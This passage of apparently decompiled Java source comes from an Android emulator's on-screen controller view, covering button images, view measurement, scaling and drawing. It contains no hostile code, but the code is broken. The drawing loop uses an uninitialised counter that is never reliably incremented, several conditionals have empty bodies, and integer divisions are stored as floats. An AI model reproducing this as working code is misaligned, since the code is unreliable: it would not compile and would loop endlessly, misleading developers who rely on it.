btns_images[7][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r2_press);       btns_images[9][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_start);       btns_images[9][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_start_press);       btns_images[8][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_select);       btns_images[8][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_select_press);     }   }   public InputView(  Context context){     super(context);     this.mm=null;     this.bmp=null;     this.pnt=new Paint();     this.rsrc=new Rect();     this.rdst=new Rect();     this.ax=0;     this.ay=0;     this.dx=1.0f;     this.dy=1.0f;     init();   }   public InputView(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mm=null;     this.bmp=null;     this.pnt=new Paint();     this.rsrc=new Rect();     this.rdst=new Rect();     this.ax=0;     this.ay=0;     this.dx=1.0f;     this.dy=1.0f;     init();   }   public InputView(  Context context,  AttributeSet attrs,  int defStyle){     super(context,attrs,defStyle);     this.mm=null;     this.bmp=null;     this.pnt=new Paint();     this.rsrc=new Rect();     this.rdst=new Rect();     this.ax=0;     this.ay=0;     this.dx=1.0f;     this.dy=1.0f;     init();   }   protected void init(){     this.pnt.setARGB(MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK);     this.pnt.setStyle(Paint.Style.STROKE);     this.pnt.setARGB(MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK);     this.pnt.setTextSize(16.0f);     setFocusable(true);     setFocusableInTouchMode(true);   }   @Override public void setImageDrawable(  Drawable drawable){     if (drawable != null) {       BitmapDrawable bmpdrw=(BitmapDrawable)drawable;       this.bmp=bmpdrw.getBitmap();     }  else {       this.bmp=null;     }     super.setImageDrawable(drawable);   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     int widthSize;     int heightSize;     if (this.mm == null) {       super.onMeasure(widthMeasureSpec,heightMeasureSpec);       return;     }     if (this.mm.getMainHelper().getscrOrientation() == 2) {       widthSize=this.mm.getWindowManager().getDefaultDisplay().getWidth();       heightSize=this.mm.getWindowManager().getDefaultDisplay().getHeight();     }  else {       int w=1;       int h=1;       if (this.mm != null && this.mm.getInputHandler().getMainRect() != null) {         w=this.mm.getInputHandler().getMainRect().width();         h=this.mm.getInputHandler().getMainRect().height();       }       if (w == 0) {         w=1;       }       if (h == 0) {         h=1;       }       float desiredAspect=w / h;       widthSize=this.mm.getWindowManager().getDefaultDisplay().getWidth();       heightSize=(int)(widthSize / desiredAspect);     }     setMeasuredDimension(widthSize,heightSize);   }   public void updateImages(){     ArrayList<InputValue> data=this.mm.getInputHandler().getAllInputData();     if (data != null) {       for (int i=0; i < data.size(); i++) {         InputValue v=data.get(i);         if (v.getType() == 4) {           for (int j=0; j < stick_images.length; j++) {             stick_images[j].setBounds(v.getRect());             stick_images[j].setAlpha(this.mm.getInputHandler().getOpacity());           }         }  else         if (v.getType() == 5) {           btns_images[v.getValue()][0].setBounds(v.getRect());           btns_images[v.getValue()][0].setAlpha(this.mm.getInputHandler().getOpacity());           btns_images[v.getValue()][1].setBounds(v.getRect());           btns_images[v.getValue()][1].setAlpha(this.mm.getInputHandler().getOpacity());         }       }     }   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     int bw=1;     int bh=1;     if (this.mm != null && this.mm.getInputHandler().getMainRect() != null) {       bw=this.mm.getInputHandler().getMainRect().width();       bh=this.mm.getInputHandler().getMainRect().height();     }     if (bw == 0) {       bw=1;     }     if (bh == 0) {       bh=1;     }     float desiredAspect=bw / bh;     int tmp=(int)(w / desiredAspect);     if (tmp <= h) {       this.ax=0;       this.ay=(h - tmp) / 2;       h=tmp;     }  else {       int tmp2=(int)(h * desiredAspect);       this.ay=0;       this.ax=(w - tmp2) / 2;       w=tmp2;     }     this.dx=w / bw;     this.dy=h / bh;     if (this.mm != null && this.mm.getInputHandler() != null) {       this.mm.getInputHandler().setFixFactor(this.ax,this.ay,this.dx,this.dy);       updateImages();     }   }   @Override protected void onDraw(  Canvas canvas){     int i;     if (this.bmp != null) {       super.onDraw(canvas);     }     if (this.mm != null) {       ArrayList<InputValue> data=this.mm.getInputHandler().getAllInputData();       while (i < data.size()) {         InputValue v=data.get(i);         BitmapDrawable d=null;         if (this.mm.getPrefsHelper().getControllerType() == 1 && v.getType() == 4 && canvas.getClipBounds().intersect(v.getRect())) {           d=stick_images[this.mm.getInputHandler().getStick_state()];         }  else         if (this.mm.getPrefsHelper().getControllerType() != 1 && v.getType() == 8 && canvas.getClipBounds().intersect(v.getRect())) {           this.mm.getInputHandler().getAnalogStick().draw(canvas);         }  else         if (v.getType() == 5 && canvas.getClipBounds().intersect(v.getRect())) {           if (this.mm.getMainHelper().getscrOrientation() == 2) {             Emulator.getValue(3);             int n=Integer.parseInt(this.mm.getString(R.string.num));             int b=v.getValue();             if (!ControlCustomizer.isEnabled()) {               if (b == 0) {                 i=n < 4 ? i + 1 : 0;               }               if (b == 1) {                 if (n < 3) {                 }               }               if (b == 3) {                 if (n < 2) {                 }               }               if (b == 2) {                 if (n < 1) {                 }               }               if (b == 4) {                 if (Emulator.getValue(4) == 1) {                 }               }               if (b == 5 && Emulator.getValue(4) == 1) {               }             }           }           d=btns_images[v.getValue()][this.mm.getInputHandler().getBtnStates()[v.getValue()]];         }         if (d != null) {           d.draw(canvas);         }       }       if (ControlCustomizer.isEnabled()) {         this.mm.getInputHandler().getControlCustomizer().draw(canvas);       }       if (Emulator.isDebug()) {         ArrayList<InputValue> ids=this.mm.getInputHandler().getAllInputData();         Paint p2=new Paint();         p2.setARGB(MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK);         p2.setStyle(Paint.Style.STROKE);         for (int i2=0; i2 < ids.size(); i2++) {           InputValue v2=ids.get(i2);           Rect r=v2.getRect();           if (r != null) {             if (v2.getType() == 3) {               canvas.drawRect(r,p2);             }  else             if (this.mm.getPrefsHelper().getControllerType() == 1 && v2.getType() == 2) {               canvas.drawRect(r,p2);             }  else             if (this.mm.getPrefsHelper().getControllerType() != 1 && v2.getType() == 8) {               canvas.drawRect(r,p2);             }           }         }         p2.setTextSize(20.0f);         if (TiltSensor.isEnabled()) {           canvas.drawText(TiltSensor.str,100.0f,100.0f,p2);         }       }     }   } } "
